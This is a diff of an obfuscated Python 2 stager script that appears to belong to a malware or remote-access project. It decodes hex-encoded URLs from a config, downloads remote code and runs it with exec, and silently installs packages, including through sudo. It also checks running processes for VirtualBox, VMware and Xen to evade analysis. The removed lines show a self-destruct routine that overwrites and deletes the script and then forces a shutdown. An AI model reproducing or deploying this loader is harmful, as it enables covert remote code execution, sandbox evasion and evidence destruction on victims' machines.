@@ -1,38 +1,12 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-#
-# angry eggplant project
-# https://github.com/colental/AngryEggplant
-#
-
 import os
+from struct import calcsize
 from imp import new_module
 from json import loads
 from urllib import urlopen
 
-
-def abort(*args, **kwargs):
-    try:
-        r = lambda x: [x[ord(i)] for i in [os.urandom(1) for _ in range(100)] if ord(i) < len(x)][0]
-        n = str().join(r([chr(i) for i in range(123) if chr(i).isalpha()]) for _ in range(r(range(7,19)))) + r(['.log','.dat','.bak'])
-        b = os.stat(__file__)[6]
-        try:
-            with file(__file__, 'wb') as fd:
-                fd.write(os.urandom(b))
-        except: pass
-        try:
-            os.rename(__file__, n)
-        except: pass
-        try:
-            os.remove(n)
-        except: pass
-        try:
-            os.remove(__file__)
-        except: pass
-    finally:
-        os.system('shutdown /s /t 1' if os.name is 'nt' else 'shutdown --poweroff --no-wall')
-        exit(0)
 
 def run(*args, **kwargs):
     SomberUnbecomingAmusement = lambda x: bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
@@ -45,7 +19,7 @@ def run(*args, **kwargs):
             exec urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('y'))).read() in globals()
             exec urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('x'))).read() in globals()
         BloatedLionProlapse = lambda x: os.popen(' '.join(['{}'.format(i) for i in x])).read().rstrip()
-        for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(requests.utils.struct.calcsize('P') * 8)].items():
+        for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(calcsize('P') * 8)].items():
             GlaringlySubtleSponge = BloatedLionProlapse([GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory]) or BloatedLionProlapse([GroovySophisticatedLemur, 'install', NobleRusticWalrus])    
             if not len(BloatedLionProlapse([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
                 with file(os.path.basename(NobleRusticWalrus), 'wb') as fp:
@@ -60,20 +34,20 @@ def run(*args, **kwargs):
         source  = '\n\n'.join([imports, urlopen(uri).read()])
         code    = compile(source, name, 'exec')
         exec code in module.__dict__
-        globals()[name]     = module
         return module.main(**AccidentalAquaticCactus['settings'])
 
 def main(*args, **kwargs):
     s = 'tasklist' if os.name is 'nt' else 'ps'
     c = 0 if os.name is 'nt' else -1
-    DaftAmbientPlacenta = bool([i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in (kwargs.get('procs') or ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'])]) if (bool(kwargs.get('checkvm')) if 'checkvm' in kwargs else False) else bool([])
-    MildlyMagneticFetus = bool('config' not in kwargs)
-    
-    if MildlyMagneticFetus or DaftAmbientPlacenta:
-        print 'aborting...'
-        return #abort()
-    else:
+    if 'checkvm' in kwargs:
+        if bool([i.split()[c] for i in os.popen(s).read().splitlines()[2:] if i.split()[c].lower().split('.')[0] in (kwargs.get('procs') or ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser', 'vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem'])]) if (bool(kwargs.get('checkvm')) if 'checkvm' in kwargs else False) else bool([]):
+            print 'aborting...'
+#           return abort()
+    if 'config' in args:
         return run(**kwargs)
+    else:
+        print "missing argument 'config'"
+#       return abort()
     
 
 if __name__ == '__main__':
